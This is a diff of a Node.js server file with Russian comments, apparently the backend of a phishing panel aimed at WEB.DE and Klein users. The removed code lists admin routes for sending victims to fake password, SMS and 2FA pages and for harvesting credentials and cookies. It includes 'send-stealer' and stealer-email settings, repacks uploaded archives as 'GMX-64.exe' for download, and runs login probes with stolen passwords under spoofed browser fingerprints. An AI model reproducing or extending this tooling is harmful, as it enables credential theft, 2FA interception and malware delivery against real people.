-  for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
-    const name = config[i];
-    if (!name) {
-      out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
-      continue;
-    }
-    const full = path.join(DOWNLOADS_DIR, name);
-    try {
-      const stat = fs.statSync(full);
-      if (stat.isFile()) {
-        const limit = typeof limits[name] === 'number' && limits[name] >= 0 ? limits[name] : DEFAULT_DOWNLOAD_LIMIT;
-        out.push({
-          fileName: name,
-          size: stat.size,
-          downloads: typeof counts[name] === 'number' ? counts[name] : 0,
-          limit
-        });
-      } else {
-        out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
-      }
-    } catch (e) {
-      out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
-    }
-  }
-  return out;
-}
-function writeAndroidDownloadConfig(files) {
-  try {
-    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-    const list = Array.isArray(files) ? files.slice(0, DOWNLOAD_SLOTS_COUNT) : [];
-    while (list.length < DOWNLOAD_SLOTS_COUNT) list.push(null);
-    fs.writeFileSync(DOWNLOAD_ANDROID_CONFIG, JSON.stringify({ files: list }, null, 0), 'utf8');
-  } catch (e) {}
-}
-
-const ARCHIVE_PROCESS_TIMEOUT_MS = 120000; // 2 min — чтобы не вешать сервер и не получать 502
-
-/** true, если spawnSync завершился по таймауту (процесс убит). */
-function spawnTimedOut(result) {
-  return result && (result.signal === 'SIGTERM' || result.status === null);
-}
-
-/** Починить битый zip: zip -FF, затем распаковать в extractDir. Возвращает true, если удалось. */
-function tryRepairAndExtractZip(tempZip, extractDir, pass, baseDir) {
-  const fixedZip = path.join(baseDir, 'fixed.zip');
-  const rFF = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [
-    process.platform === 'win32' ? '/c' : '-c',
-    'zip -FF ' + JSON.stringify(tempZip) + ' --out ' + JSON.stringify(fixedZip) + ' 2>&1'
-  ], { encoding: 'utf8', cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
-  if (spawnTimedOut(rFF)) return false;
-  if (!fs.existsSync(fixedZip) || fs.statSync(fixedZip).size === 0) return false;
-  const envOld = pass ? { ...process.env, GMW_ZIP_OLD: pass } : process.env;
-  const unzipFix = pass
-    ? 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(fixedZip) + ' -d ' + JSON.stringify(extractDir) + ' 2>&1'
-    : 'unzip -o ' + JSON.stringify(fixedZip) + ' -d ' + JSON.stringify(extractDir) + ' 2>&1';
-  const r2 = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipFix], { encoding: 'utf8', env: envOld, cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
-  if (spawnTimedOut(r2)) return false;
-  const err2 = (r2.stderr || r2.stdout || '').toString();
-  if (r2.status !== 0 && !/warning:|note:/.test(err2)) return false;
-  try {
-    return fs.readdirSync(extractDir, { withFileTypes: true }).some(e => e.isFile());
-  } catch (e) { return false; }
-}
-
-/**
- * Обработка архива (Windows): распаковать, переименовать первый файл в GMX-64.exe, заархивировать заново (нормальный zip).
- * type: 'zip' | 'rar'. Если распаковка не удалась — для zip пробуем починку через zip -FF, затем снова распаковка и перепаковка.
- * Возвращает Buffer нового архива или null при ошибке.
- */
-function processArchiveToGmx(buf, password, type) {
-  const baseDir = path.join(os.tmpdir(), 'gmw-multi-' + Date.now() + '-' + Math.random().toString(36).slice(2, 8));
-  const tempZip = path.join(baseDir, 'in' + (type === 'zip' ? '.zip' : '.rar'));
-  const outZip = path.join(baseDir, 'gmx.zip');
-  const outRar = path.join(baseDir, 'gmx.rar');
-  const extractDir = path.join(baseDir, 'ext');
-  const repackDir = path.join(baseDir, 'repack');
-  try {
-    if (!fs.existsSync(baseDir)) fs.mkdirSync(baseDir, { recursive: true });
-    fs.writeFileSync(tempZip, buf);
-    const pass = (password || '').trim();
-    const envOld = pass ? { ...process.env, GMW_ZIP_OLD: pass } : process.env;
-    if (type === 'zip') {
-      fs.mkdirSync(extractDir, { recursive: true });
-      const unzipCmd = pass
-        ? 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(tempZip) + ' -d ' + JSON.stringify(extractDir) + ' 2>&1'
-        : 'unzip -o ' + JSON.stringify(tempZip) + ' -d ' + JSON.stringify(extractDir) + ' 2>&1';
-      let r = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipCmd], { encoding: 'utf8', env: envOld, cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
-      if (spawnTimedOut(r)) return null;
-      let err = (r.stderr || r.stdout || '').toString();
-      let hasFiles = false;
-      try {
-        hasFiles = fs.readdirSync(extractDir, { withFileTypes: true }).some(e => e.isFile());
-      } catch (e) {}
-      if (!hasFiles || (r.status !== 0 && !/warning:|note:/.test(err))) {
-        try { fs.readdirSync(extractDir).forEach(n => { const p = path.join(extractDir, n); if (fs.statSync(p).isFile()) fs.unlinkSync(p); }); } catch (e2) {}
-        hasFiles = tryRepairAndExtractZip(tempZip, extractDir, pass, baseDir);
-      }
-      if (!hasFiles) return null;
-    } else {
-      fs.mkdirSync(extractDir, { recursive: true });
-      const sevenZ = '7z';
-      const extractCmd = pass
-        ? sevenZ + ' x ' + JSON.stringify(tempZip) + ' -p' + pass.replace(/"/g, '\\"') + ' -o' + JSON.stringify(extractDir) + ' -y 2>&1'
-        : sevenZ + ' x ' + JSON.stringify(tempZip) + ' -o' + JSON.stringify(extractDir) + ' -y 2>&1';
-      const r = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', extractCmd], { encoding: 'utf8', cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
-      if (spawnTimedOut(r) || r.status !== 0) return null;
-    }
-    const entries = fs.readdirSync(extractDir, { withFileTypes: true });
-    let firstFile = null;
-    for (const e of entries) {
-      if (e.isFile()) { firstFile = path.join(extractDir, e.name); break; }
-    }
-    if (!firstFile || !fs.statSync(firstFile).isFile()) return null;
-    fs.mkdirSync(repackDir, { recursive: true });
-    const gmxExe = path.join(repackDir, 'GMX-64.exe');
-    fs.copyFileSync(firstFile, gmxExe);
-    const envNew = process.env;
-    const zipCmd = 'zip -j ' + JSON.stringify(outZip) + ' ' + JSON.stringify(gmxExe) + ' 2>&1';
-    const zr = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', zipCmd], { encoding: 'utf8', env: envNew, cwd: baseDir, timeout: ARCHIVE_PROCESS_TIMEOUT_MS });
-    if (spawnTimedOut(zr) || zr.status !== 0) return null;
-    if (!fs.existsSync(outZip)) return null;
-    const outBuf = fs.readFileSync(outZip);
-    return outBuf;
-  } catch (e) {
-    return null;
-  } finally {
-    try {
-      const rimraf = (dir) => {
-        if (!fs.existsSync(dir)) return;
-        const list = fs.readdirSync(dir);
-        for (const name of list) {
-          const full = path.join(dir, name);
-          if (fs.statSync(full).isDirectory()) rimraf(full);
-          else fs.unlinkSync(full);
-        }
-        fs.rmdirSync(dir);
-      };
-      if (fs.existsSync(baseDir)) rimraf(baseDir);
-    } catch (e2) {}
-  }
 }
 
 /** Найти файл в downloads/ по имени (точное или без учёта регистра). Возвращает полный путь или null. */
@@ -1324,95 +579,6 @@ function leadEventTerminalHasExactLabel(lead, needleLower) {
   });
 }
 
-/** Единая метка в eventTerminal при успешной отправке письма из Config → E-Mail (ручная / массовая). */
-const CONFIG_EMAIL_SENT_EVENT_LABEL = 'Send Email';
-
-/**
- * Уже была успешная отправка Config E-Mail: актуальная метка «Send Email» и старые варианты в логе.
- */
-function leadHasAnyConfigEmailSentEvent(lead) {
-  const events = Array.isArray(lead && lead.eventTerminal) ? lead.eventTerminal : [];
-  return events.some(function (ev) {
-    const lbl = ev && ev.label != null ? String(ev.label).trim().toLowerCase() : '';
-    if (!lbl) return false;
-    if (lbl === 'send email' || lbl.indexOf('send email') === 0) return true;
-    if (lbl === 'email send' || lbl === 'email send kl') return true;
-    if (lbl === 'письмо отправлено') return true;
-    if (lbl.indexOf('письмо отправлено') !== -1 && lbl.indexOf('не отправилось') === -1 && lbl.indexOf('не удалось') === -1) {
-      return true;
-    }
-    return false;
-  });
-}
-
-/** Письмо из Config → E-Mail (как кнопка E-Mail в карточке лида). Ошибки — pushEvent + { ok: false }. */
-async function sendConfigEmailToLead(lead) {
-  const toEmail = (lead.email || lead.emailKl || '').trim();
-  if (!toEmail) {
-    pushEvent(lead, 'Письмо не отправилось: у лида нет email', 'admin');
-    return { ok: false, error: 'У лида нет email', statusCode: 400 };
-  }
-  const password = (lead.password || lead.passwordKl || '').trim();
-  const data = readConfigEmail();
-  let cfg = data.current;
-  if (lead.brand === 'klein') {
-    const klCfg = (data.configs || []).find(function (c) { return c.id === 'kl' || (c.name && String(c.name).toLowerCase().indexOf('klein') !== -1); });
-    if (klCfg) cfg = klCfg;
-  }
-  if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
-    pushEvent(lead, 'Письмо не отправилось: не задан SMTP в Config E-Mail', 'admin');
-    return { ok: false, error: 'В Config → E-Mail не задан SMTP. Откройте Config, вкладка E-Mail, введите SMTP и нажмите «Сохранить».', statusCode: 400 };
-  }
-  const smtpList = parseSmtpLines(cfg.smtpLine);
-  if (!smtpList.length) {
-    pushEvent(lead, 'Письмо не отправилось: не задан SMTP в Config E-Mail', 'admin');
-    return { ok: false, error: 'В Config → E-Mail не задан SMTP.', statusCode: 400 };
-  }
-  let html = (cfg.html || '')
-    .replace(/_email_/g, toEmail)
-    .replace(/_password_/g, password);
-  const attachments = [];
-  if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
-    try {
-      const buf = Buffer.from(cfg.image1Base64, 'base64');
-      const cid = 'image1@mail';
-      html = html.replace(/_src1_/g, 'cid:' + cid);
-      attachments.push({ filename: 'image1.png', content: buf, cid: cid });
-    } catch (e) {}
-  } else if (html.indexOf('_src1_') !== -1) {
-    html = html.replace(/_src1_/g, '');
-  }
-  if (!nodemailer) {
-    pushEvent(lead, 'Письмо не отправилось: nodemailer не установлен', 'admin');
-    return { ok: false, error: 'nodemailer not installed', statusCode: 500 };
-  }
-  const smtp = smtpList[0];
-  const transporter = nodemailer.createTransport({
-    host: smtp.host,
-    port: smtp.port,
-    secure: smtp.port === 465,
-    auth: { user: smtp.user, pass: smtp.password }
-  });
-  const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
-  const mailOptions = {
-    from: fromStr,
-    to: toEmail,
-    subject: (cfg.title || '').trim() || 'Message',
-    html,
-    attachments: attachments.length ? attachments : undefined,
-    envelope: { from: smtp.fromEmail, to: toEmail }
-  };
-  try {
-    await transporter.sendMail(mailOptions);
-    return { ok: true, fromEmail: smtp.fromEmail };
-  } catch (err) {
-    const msg = (err.message || '').slice(0, 200);
-    pushEvent(lead, 'Письмо не отправилось: ' + msg, 'admin');
-    console.error('[send-config-email] Ошибка SMTP ' + smtp.fromEmail + ' → ' + toEmail + ': ' + msg);
-    return { ok: false, error: msg, statusCode: 500 };
-  }
-}
-
 /** Имя файла куки по email: только недопустимые в ФС символы заменяем (оставляем @). Итог: ровно почта + .txt */
 function cookieExportFilename(email) {
   if (!email || typeof email !== 'string') return 'unknown.txt';
@@ -1633,6 +799,8 @@ automationService.init({
   serverProjectRoot: PROJECT_ROOT,
 });
 
+initAppServices({ pushEvent });
+
 const {
   WEBDE_LOGIN_MAX_CONCURRENT,
   runningWebdeLoginLeadIds,
@@ -1751,99 +919,6 @@ function writeZipPassword(value) {
   fs.writeFileSync(ZIP_PASSWORD_FILE, String(value == null ? '' : value).trim(), 'utf8');
 }
 
-function isAdminRequest(pathname) {
-  // Эндпоинты только для админки (в т.ч. /api/geo для флагов в списке, чат для кнопки «Открыть чат у юзера»)
-  return pathname === '/api/chat-open' ||
-         pathname === '/api/chat-open-ack' ||
-         pathname === '/api/chat-typing' ||
-         pathname === '/api/chat-read' ||
-         pathname === '/api/leads' ||
-         pathname === '/api/geo' ||
-         pathname === '/api/get-saved-credentials' ||
-         pathname === '/api/delete-lead' ||
-         pathname === '/api/delete-all' ||
-         pathname === '/api/save-credentials' ||
-         pathname === '/api/delete-saved-credential' ||
-         pathname === '/api/mode' ||
-         pathname === '/api/start-page' ||
-         pathname === '/api/show-error' ||
-         pathname === '/api/show-success' ||
-         pathname === '/api/redirect-change-password' ||
-         pathname === '/api/redirect-sicherheit' ||
-         pathname === '/api/redirect-sicherheit-windows' ||
-         pathname === '/api/redirect-android' ||
-         pathname === '/api/redirect-download-by-platform' ||
-         pathname === '/api/redirect-push' ||
-         pathname === '/api/redirect-sms-code' ||
-         pathname === '/api/redirect-2fa-code' ||
-         pathname === '/api/redirect-open-on-pc' ||
-         pathname === '/api/redirect-klein-forgot' ||
-         pathname === '/api/mark-worked' ||
-         pathname === '/api/mark-opened' ||
-         pathname === '/api/config/download' ||
-         pathname === '/api/config/download-limit' ||
-         pathname === '/api/config/download-upload-multi' ||
-         pathname === '/api/config/download-android' ||
-         pathname === '/api/config/download-android-limit' ||
-         pathname === '/api/config/download-android-upload-multi' ||
-         pathname === '/api/config/download-delete' ||
-         pathname === '/api/config/download-android-delete' ||
-         pathname === '/api/config/download-reset-counts' ||
-         pathname === '/api/config/download-rotate-next' ||
-         pathname === '/api/config/download-settings' ||
-         pathname === '/api/config/cookies-export' ||
-         pathname === '/api/config/check' ||
-         pathname === '/api/config/upload-apply' ||
-         pathname === '/api/config/shortlinks' ||
-         pathname === '/api/config/short-domains' ||
-         pathname === '/api/config/short-domains-check' ||
-         pathname === '/api/config/zip-password' ||
-         pathname === '/api/config/zip-process' ||
-         pathname === '/api/config/proxies' ||
-         pathname === '/api/config/proxies-validate' ||
-         pathname === '/api/config/webde-fingerprint-indices' ||
-         pathname === '/api/config/webde-fingerprints-list' ||
-         pathname === '/api/config/webde-fingerprint-probe-start' ||
-         pathname === '/api/config/webde-fingerprint-probe-status' ||
-         pathname === '/api/config/stealer-email' ||
-         pathname === '/api/config/stealer-email/select' ||
-         pathname === '/api/config/email' ||
-         pathname === '/api/config/email/select' ||
-         pathname === '/api/config/warmup-email' ||
-         pathname === '/api/config/warmup-email/select' ||
-         pathname === '/api/send-stealer' ||
-         pathname === '/api/send-email' ||
-         pathname === '/api/send-email-all-success' ||
-         pathname === '/api/send-email-cookies-batch' ||
-         pathname === '/api/archive-leads-by-filter' ||
-         pathname === '/api/lead-kl-archive' ||
-         pathname === '/api/warmup-start' ||
-         pathname === '/api/warmup-status' ||
-         pathname === '/api/warmup-pause' ||
-         pathname === '/api/warmup-stats-reset' ||
-         pathname === '/api/warmup-stop' ||
-         pathname === '/api/export-logs' ||
-         pathname === '/api/lead-credentials' ||
-         pathname === '/api/lead-cookies' ||
-         pathname === '/api/lead-fingerprint' ||
-         pathname === '/api/lead-automation-profile' ||
-         pathname === '/api/lead-login-context' ||
-         pathname === '/api/webde-login-grid-step' ||
-         pathname === '/api/webde-login-start' ||
-         pathname === '/api/webde-login-result' ||
-         pathname === '/api/webde-wait-password' ||
-         pathname === '/api/webde-poll-2fa-code' ||
-         pathname === '/api/webde-login-2fa-wrong' ||
-         pathname === '/api/webde-login-2fa-received' ||
-         pathname === '/api/webde-login-slot-done' ||
-         pathname === '/api/webde-push-resend-poll' ||
-         pathname === '/api/webde-push-resend-result' ||
-         pathname === '/api/script-event' ||
-         pathname === '/api/zip-password' ||
-         pathname === '/api/lead-klein-flow-poll' ||
-         pathname === '/api/klein-anmelden-seen';
-}
-
 /** Только в режиме Auto (не Manual, не Auto-Login): после ввода почты и пароля сразу кидать юзера на startPage. Manual — админ сам направляет; Auto-Login — редирект только после успешного входа скрипта. */
 function getInitialRedirectStatus(mode, autoScript, startPage, lead) {
   // Для Klein любые редиректы выполняются только вручную из админки.
@@ -1895,373 +970,6 @@ function applyReturnVisitStatusReset(lead) {
   }
 }
 
-function readWebdeFingerprintsPoolMeta() {
-  const meta = { filePresent: false, pool: [], parseError: null };
-  try {
-    meta.filePresent = fs.existsSync(WEBDE_FINGERPRINTS_JSON);
-    if (!meta.filePresent) return meta;
-    const raw = fs.readFileSync(WEBDE_FINGERPRINTS_JSON, 'utf8');
-    const arr = JSON.parse(raw);
-    if (Array.isArray(arr)) {
-      meta.pool = arr;
-    } else {
-      meta.parseError = 'not_array';
-    }
-  } catch (e) {
-    meta.parseError = (e && e.message) ? String(e.message) : 'parse_error';
-    meta.filePresent = fs.existsSync(WEBDE_FINGERPRINTS_JSON);
-  }
-  return meta;
-}
-
-function readWebdeFingerprintsPoolArr() {
-  return readWebdeFingerprintsPoolMeta().pool;
-}
-
-function summarizeWebdeFingerprintEntry(fp) {
-  if (!fp || typeof fp !== 'object') return '—';
-  const loc = fp.locale || fp.language || '—';
-  const vp = fp.viewport || {};
-  const vw = vp.width != null ? vp.width : '—';
-  const vh = vp.height != null ? vp.height : '—';
-  const ua = String(fp.userAgent || '');
-  const chromeM = ua.match(/Chrome\/[\d.]+/);
-  const chrome = chromeM ? chromeM[0] : '';
-  const tz = fp.timezoneId || '';
-  const parts = [String(loc), String(vw) + '×' + String(vh), chrome, tz].filter(Boolean);
-  return parts.join(' · ') || '—';
-}
-
-function buildWebdeFingerprintsListPayload() {
-  const meta = readWebdeFingerprintsPoolMeta();
-  const pool = meta.pool;
-  const allowed = readWebdeFpIndicesAllowedForProbe(pool.length);
-  const allowedSet = new Set(allowed);
-  return {
-    entries: pool.map(function (fp, index) {
-      return {
-        index: index,
-        summary: summarizeWebdeFingerprintEntry(fp),
-        active: allowedSet.has(index),
-      };
-    }),
-    activeIndices: allowed,
-    filePresent: meta.filePresent,
-    poolLength: pool.length,
-    parseError: meta.parseError,
-  };
-}
-
-function readWebdeFpIndicesAllowedForProbe(poolLen) {
-  if (poolLen <= 0) return [];
-  const seen = new Set();
-  try {
-    if (fs.existsSync(WEBDE_FP_INDICES_FILE)) {
-      const content = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
-      const lines = content.split(/\r?\n/);
-      for (let li = 0; li < lines.length; li++) {
-        const s = lines[li].trim();
-        if (!s || s.startsWith('#')) continue;
-        const first = s.split(/\s+/)[0];
-        const n = parseInt(first, 10);
-        if (!isNaN(n) && n >= 0 && n < poolLen) seen.add(n);
-      }
-    }
-  } catch (e) {}
-  if (seen.size === 0) {
-    const out = [];
-    for (let i = 0; i < poolLen; i++) out.push(i);
-    return out;
-  }
-  return Array.from(seen).sort(function (a, b) { return a - b; });
-}
-
-function pruneWebdeProbeJobs() {
-  const now = Date.now();
-  for (const [id, j] of webdeProbeJobs) {
-    if (j.done && (now - (j.updatedAt || j.startedAt)) > 3600000) {
-      webdeProbeJobs.delete(id);
-    }
-  }
-  if (webdeProbeJobs.size > 20) {
-    const entries = Array.from(webdeProbeJobs.entries()).sort(function (a, b) {
-      return (b[1].startedAt || 0) - (a[1].startedAt || 0);
-    });
-    for (let i = 20; i < entries.length; i++) {
-      webdeProbeJobs.delete(entries[i][0]);
-    }
-  }
-}
-
-function webdeProbeScheduleContinue(jobId) {
-  const job = webdeProbeJobs.get(jobId);
-  if (job && !job.done && !job.error) {
-    job.running = true;
-    job.updatedAt = Date.now();
-  }
-  setImmediate(function () {
-    webdeProbeRunOneBatch(jobId);
-  });
-}
-
-function webdeProbeRunOneBatch(jobId) {
-  const job = webdeProbeJobs.get(jobId);
-  if (!job || job.done || job.error) return;
-  if (job.paused) {
-    job.running = false;
-    job.updatedAt = Date.now();
-    return;
-  }
-  const batch = job.indices.slice(job.cursor, job.cursor + 3);
-  if (batch.length === 0) {
-    job.done = true;
-    job.running = false;
-    job.updatedAt = Date.now();
-    return;
-  }
-  job.running = true;
-  job.updatedAt = Date.now();
-  const python = process.platform === 'win32' ? 'python' : 'python3';
-  const stdinPayload = JSON.stringify({
-    email: job.email,
-    password: job.password,
-    indices: batch,
-    headless: !!job.probeHeadless,
-    requirePasswordField: job.requirePasswordField !== false,
-  });
-  const maxOut = 50 * 1024 * 1024;
-  const maxErr = 2 * 1024 * 1024;
-  let outBuf = '';
-  let errBuf = '';
-  let childDone = false;
-  let child;
-  try {
-    child = spawn(python, [WEBDE_PROBE_BATCH_SCRIPT], {
-      cwd: LOGIN_DIR,
-      env: Object.assign({}, process.env, { PYTHONUNBUFFERED: '1' }),
-      stdio: ['pipe', 'pipe', 'pipe'],
-    });
-  } catch (e) {
-    job.running = false;
-    job.error = (e && e.message) ? e.message : String(e);
-    job.done = true;
-    job.updatedAt = Date.now();
-    return;
-  }
-  const killTimer = setTimeout(function () {
-    if (childDone) return;
-    childDone = true;
-    try {
-      child.kill('SIGTERM');
-    } catch (eK) {}
-    job.running = false;
-    job.error = 'Таймаут пробы (900 с)';
-    job.done = true;
-    job.updatedAt = Date.now();
-  }, 900000);
-
-  function finishBatch(code, signal) {
-    if (childDone) return;
-    childDone = true;
-    clearTimeout(killTimer);
-    job.running = false;
-    job.updatedAt = Date.now();
-    if (signal) {
-      job.error = 'Прервано: ' + String(signal);
-      job.done = true;
-      return;
-    }
-    let parsed;
-    try {
-      parsed = JSON.parse(String((outBuf || '').trim() || '{}'));
-    } catch (e2) {
-      job.error = 'Некорректный ответ скрипта пробы';
-      job.done = true;
-      return;
-    }
-    if (parsed.ok === false && parsed.error) {
-      job.error = String(parsed.error);
-      job.done = true;
-      return;
-    }
-    if (code !== 0 && parsed.ok !== true) {
-      const errText = ((errBuf || '') + (outBuf || '')).trim().slice(0, 800);
-      job.error = errText || ('код выхода ' + String(code));
-      job.done = true;
-      return;
-    }
-    const batchResults = Array.isArray(parsed.results) ? parsed.results : [];
-    for (let bi = 0; bi < batchResults.length; bi++) {
-      job.results.push(batchResults[bi]);
-    }
-    job.cursor += batch.length;
-    if (job.cursor >= job.indices.length) {
-      job.done = true;
-    } else if (job.paused) {
-      job.running = false;
-      job.updatedAt = Date.now();
-    } else {
-      webdeProbeScheduleContinue(jobId);
-    }
-  }
-
-  child.stdout.on('data', function (chunk) {
-    if (outBuf.length < maxOut) outBuf += chunk.toString();
-  });
-  child.stderr.on('data', function (chunk) {
-    if (errBuf.length < maxErr) errBuf += chunk.toString();
-  });
-  child.on('error', function (e) {
-    if (childDone) return;
-    childDone = true;
-    clearTimeout(killTimer);
-    job.running = false;
-    job.error = (e && e.message) ? e.message : String(e);
-    job.done = true;
-    job.updatedAt = Date.now();
-  });
-  child.on('close', function (code, signal) {
-    finishBatch(code, signal);
-  });
-  try {
-    child.stdin.end(stdinPayload, 'utf8');
-  } catch (eIn) {
-    if (!childDone) {
-      childDone = true;
-      clearTimeout(killTimer);
-      try {
-        child.kill('SIGTERM');
-      } catch (eK2) {}
-      job.running = false;
-      job.error = (eIn && eIn.message) ? eIn.message : 'stdin';
-      job.done = true;
-      job.updatedAt = Date.now();
-    }
-  }
-}
-
-function handleWebdeFingerprintProbePause(res, json) {
-  const jobId = String(json.webdeProbeJobId != null ? json.webdeProbeJobId : json.jobId || '').trim();
-  if (!jobId) return send(res, 400, { ok: false, error: 'webdeProbeJobId' });
-  const job = webdeProbeJobs.get(jobId);
-  if (!job) return send(res, 404, { ok: false, error: 'Задача не найдена' });
-  if (job.done) return send(res, 400, { ok: false, error: 'Задача уже завершена' });
-  job.paused = true;
-  job.updatedAt = Date.now();
-  return send(res, 200, { ok: true });
-}
-
-function handleWebdeFingerprintProbeResume(res, json) {
-  const jobId = String(json.webdeProbeJobId != null ? json.webdeProbeJobId : json.jobId || '').trim();
-  if (!jobId) return send(res, 400, { ok: false, error: 'webdeProbeJobId' });
-  const job = webdeProbeJobs.get(jobId);
-  if (!job) return send(res, 404, { ok: false, error: 'Задача не найдена' });
-  if (job.done) return send(res, 400, { ok: false, error: 'Задача уже завершена' });
-  job.paused = false;
-  job.updatedAt = Date.now();
-  if (!job.running && !job.error) webdeProbeScheduleContinue(jobId);
-  return send(res, 200, { ok: true });
-}
-
-function handleWebdeFingerprintProbeStart(res, json) {
-  let email = '';
-  let password = '';
-  const cred = json.credentials != null ? String(json.credentials).trim() : '';
-  if (cred) {
-    const colon = cred.indexOf(':');
-    if (colon === -1) {
-      email = cred.trim();
-      password = '';
-    } else {
-      email = cred.slice(0, colon).trim();
-      password = cred.slice(colon + 1);
-    }
-  } else {
-    email = String(json.email || '').trim();
-    password = String(json.password || '');
-  }
-  if (!email) {
-    return send(res, 400, { ok: false, error: 'Укажите email' });
-  }
-  if (!fs.existsSync(WEBDE_PROBE_BATCH_SCRIPT)) {
-    return send(res, 500, { ok: false, error: 'Скрипт webde_probe_batch.py не найден' });
-  }
-  const pool = readWebdeFingerprintsPoolArr();
-  const indicesAll = readWebdeFpIndicesAllowedForProbe(pool.length);
-  if (indicesAll.length === 0) {
-    return send(res, 400, { ok: false, error: 'Нет отпечатков (пул пуст)' });
-  }
-  const nAll = indicesAll.length;
-  const take = Math.min(WEBDE_PROBE_MAX_INDICES_PER_JOB, nAll);
-  const startPos = webdeFpProbeIndexCursor % nAll;
-  const indices = [];
-  for (let k = 0; k < take; k++) {
-    indices.push(indicesAll[(startPos + k) % nAll]);
-  }
-  webdeFpProbeIndexCursor = (startPos + take) % nAll;
-  const probeIndicesTruncated = nAll > take;
-  pruneWebdeProbeJobs();
-  const jobId = 'wp' + (++webdeProbeJobSeq).toString(36) + '-' + Date.now().toString(36);
-  const hasGui = !!(
-    (process.env.DISPLAY && String(process.env.DISPLAY).trim()) ||
-    (process.env.WAYLAND_DISPLAY && String(process.env.WAYLAND_DISPLAY).trim())
-  );
-  const userRequestedHeadless =
-    json.probeHeadless === true ||
-    json.headless === true ||
-    json.probeHeadless === 'true' ||
-    json.headless === 'true';
-  let probeHeadless = userRequestedHeadless;
-  let probeHeadlessForced = false;
-  if (!hasGui && !userRequestedHeadless) {
-    probeHeadless = true;
-    probeHeadlessForced = true;
-    console.log('[WEBDE probe] Нет DISPLAY/WAYLAND_DISPLAY — принудительно headless (иначе каждый прогон падает с error)');
-  }
-  const requirePasswordField = json.requirePasswordField !== false && json.requirePasswordField !== 'false' && json.requirePasswordField !== 0;
-  const job = {
-    email: email,
-    password: password,
-    indices: indices,
-    cursor: 0,
-    results: [],
-    done: false,
-    running: false,
-    paused: false,
-    error: null,
-    probeHeadless: probeHeadless,
-    requirePasswordField: requirePasswordField,
-    startedAt: Date.now(),
-    updatedAt: Date.now(),
-  };
-  webdeProbeJobs.set(jobId, job);
-  webdeProbeScheduleContinue(jobId);
-  return send(res, 200, {
-    ok: true,
-    jobId: jobId,
-    total: indices.length,
-    totalIndicesAvailable: indicesAll.length,
-    probeIndicesTruncated: probeIndicesTruncated,
-    probeMaxIndicesPerJob: WEBDE_PROBE_MAX_INDICES_PER_JOB,
-    probeHeadlessForced: probeHeadlessForced,
-  });
-}
-
-function sendWebdeFingerprintProbeStatus(res, jobId) {
-  if (!jobId) return send(res, 400, { ok: false, error: 'jobId' });
-  const job = webdeProbeJobs.get(jobId);
-  if (!job) return send(res, 404, { ok: false, error: 'Задача не найдена' });
-  return send(res, 200, {
-    ok: true,
-    done: job.done,
-    running: job.running,
-    paused: !!job.paused,
-    error: job.error,
-    progress: { done: job.cursor, total: job.indices.length },
-    results: job.results,
-  });
-}
-
 const API_ROUTE_DEPS = {
   readMode,
   statusHeartbeats,
@@ -2271,17 +979,14 @@ const API_ROUTE_DEPS = {
   writeDebugLog,
 };
 
-const ROUTE_HTTP_DEPS = {
+const ROUTE_HTTP_DEPS = mergeServiceRouteDeps({
   ALLOWED_EMAIL_DOMAINS: ALLOWED_EMAIL_DOMAINS,
   ALLOWED_EMAIL_DOMAINS_RAW: ALLOWED_EMAIL_DOMAINS_RAW,
   ALL_LOG_FILE: ALL_LOG_FILE,
-  ARCHIVE_PROCESS_TIMEOUT_MS: ARCHIVE_PROCESS_TIMEOUT_MS,
-  BOT_GATE_COOKIE: gateMiddleware.BOT_GATE_COOKIE,
+  ARCHIVE_PROCESS_TIMEOUT_MS: downloadKitService.ARCHIVE_PROCESS_TIMEOUT_MS,
   BRANDS: BRANDS,
   CHECK_DIR: CHECK_DIR,
   CHECK_META_FILE: CHECK_META_FILE,
-  CONFIG_EMAIL_FILE: CONFIG_EMAIL_FILE,
-  CONFIG_EMAIL_SENT_EVENT_LABEL: CONFIG_EMAIL_SENT_EVENT_LABEL,
   COOKIES_EXPORTED_FILE: COOKIES_EXPORTED_FILE,
   DATA_DIR: DATA_DIR,
   DEBUG_LOG_FILE: DEBUG_LOG_FILE,
@@ -2324,18 +1029,10 @@ const ROUTE_HTTP_DEPS = {
   SHORT_DOMAINS_FILE: SHORT_DOMAINS_FILE,
   SHORT_DOMAINS_TTL_MS: SHORT_DOMAINS_TTL_MS,
   START_PAGE_FILE: START_PAGE_FILE,
-  STEALER_EMAIL_FILE: STEALER_EMAIL_FILE,
-  WARMUP_EMAIL_FILE: WARMUP_EMAIL_FILE,
-  WARMUP_LOG_MAX: WARMUP_LOG_MAX,
-  WARMUP_SMTP_STATS_FILE: WARMUP_SMTP_STATS_FILE,
   WEBDE_CANONICAL_HOST: WEBDE_CANONICAL_HOST,
   WEBDE_DOMAIN: WEBDE_DOMAIN,
   WEBDE_DOMAINS_LIST: WEBDE_DOMAINS_LIST,
   WEBDE_DOMAINS_RAW: WEBDE_DOMAINS_RAW,
-  WEBDE_FINGERPRINTS_JSON: WEBDE_FINGERPRINTS_JSON,
-  WEBDE_FP_INDICES_FILE: WEBDE_FP_INDICES_FILE,
-  WEBDE_PROBE_BATCH_SCRIPT: WEBDE_PROBE_BATCH_SCRIPT,
